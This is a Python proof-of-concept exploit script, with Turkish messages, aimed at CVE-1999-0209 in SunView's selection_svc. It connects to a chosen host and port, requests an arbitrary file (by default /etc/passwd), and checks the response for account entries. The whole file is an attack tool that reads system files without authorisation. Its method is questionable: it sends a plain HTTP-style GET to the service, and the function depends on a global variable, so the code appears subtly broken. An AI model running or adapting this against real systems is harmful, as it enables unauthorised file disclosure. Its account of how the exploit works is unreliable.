import socket
import argparse
import re
import time

# CVE-1999-0209: The SunView (SunTools) selection_svc facility allows remote users to read files.
# This vulnerability allows remote attackers to exploit the selection service to read arbitrary files on the target system.
# The exploit targets SunView's selection_svc, allowing unauthorized access to file contents.

def test_sunview_selection_svc_vuln(target_host, target_port=5000, file_to_read="/etc/passwd", retries=3):
    # Example payload to request file contents via selection_svc
    request_payload = f"GET {file_to_read} HTTP/1.0\r\n\r\n"
    
    for attempt in range(retries):
        try:
            with socket.create_connection((target_host, target_port), timeout=10) as sock:
                # Send the payload to the target host
                sock.sendall(request_payload.encode())
                response = b""
                while True:
                    part = sock.recv(4096)
                    if not part:
                        break
                    response += part
                
                response_str = response.decode(errors='replace')
                if args.verbose:
                    print(f"[i] Sunucudan gelen yanıt: {response_str}")
                
                # Check if the response contains the expected file content
                if re.search(r"root:|nobody:|daemon:", response_str, re.IGNORECASE):
                    print(f"[+] ({attempt + 1}/{retries}) Hedef sistem potansiyel olarak CVE-1999-0209 zafiyetine sahip olabilir! Dosya içeriği elde edildi.")
                else:
                    print(f"[-] ({attempt + 1}/{retries}) Hedef sistemde zafiyet tespit edilemedi veya dosya içeriği elde edilemedi.")
                
                break
        except socket.timeout:
            print(f"[-] ({attempt + 1}/{retries}) Hedefe bağlanma süresi doldu. Bağlantı zaman aşımına uğradı.")
        except socket.error as e:
            print(f"[-] ({attempt + 1}/{retries}) Hedefe bağlanırken bir hata oluştu: {e}")
        except Exception as e:
            print(f"[!] Exploit sırasında bir hata oluştu: {e}")
        
        # Eğer bağlantı başarısız olursa, biraz bekleyip tekrar deneyelim.
        if attempt < retries - 1:
            time.sleep(3)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC script for SunView selection_svc File Read CVE-1999-0209")
    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
    parser.add_argument("-p", "--port", type=int, default=5000, help="Hedef sunucu port numarası (varsayılan: 5000)")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="Okunacak dosya yolu (varsayılan: /etc/passwd)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
    
    args = parser.parse_args()
    
    if args.verbose:
        print(f"[i] Hedef: {args.target}, Port: {args.port}, Dosya: {args.file}, Retries: {args.retries}")
    
    test_sunview_selection_svc_vuln(args.target, args.port, file_to_read=args.file, retries=args.retries)